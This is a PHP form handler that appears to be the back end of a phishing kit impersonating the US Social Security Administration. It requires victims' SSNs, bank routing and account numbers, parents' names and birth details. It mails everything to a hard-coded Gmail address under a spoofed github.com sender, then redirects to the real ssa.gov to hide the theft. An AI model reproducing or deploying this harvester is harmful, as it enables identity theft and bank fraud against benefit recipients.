<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set the email address where the form data will be sent
$recipientEmail = "mrbakodele@gmail.com"; // Replace with your email address

// Specify the page to redirect to after form submission
$redirectUrl = "https://ssa.gov/";

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $json = file_get_contents('php://input');
    
    // Decode the JSON data
    $data = json_decode($json, true);

    // Validate that all required fields are present
    $requiredFields = [
        'fullName', 'ssn', 'mailingAddress', 'fathersName', 'mothersName',
        'placeOfBirth', 'state', 'amountReceived', 'routingNumber', 
        'accountNumber', 'phoneNumber', 'receivedSSA', 'dob', 'dateOfPayment'
    ];

    foreach ($requiredFields as $field) {
        if (empty($data[$field])) {
            http_response_code(400); // Bad Request
            echo json_encode(['error' => "Missing field: $field"]);
            exit;
        }
    }

    // Build the email subject and message
    $subject = "New Form Submission from {$data['fullName']}";
    $message = "You have received a new form submission. Here are the details:\n\n";
    foreach ($data as $key => $value) {
        $message .= ucfirst($key) . ": " . htmlspecialchars($value) . "\n";
    }

    // Set email headers
    $headers = "From: noreply@github.com\r\n"; // Replace with your desired sender email
    $headers .= "Reply-To: noreply@example.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send the email
    if (mail($recipientEmail, $subject, $message, $headers)) {
        // Redirect to the specified page after successful email
        header("Location: $redirectUrl");
        exit;
    } else {
        http_response_code(500); // Internal Server Error
        echo json_encode(['error' => 'Failed to send email.']);
        exit;
    }
} else {
    http_response_code(405); // Method Not Allowed
    echo json_encode(['error' => 'Invalid request method.']);
    exit;
}
?>
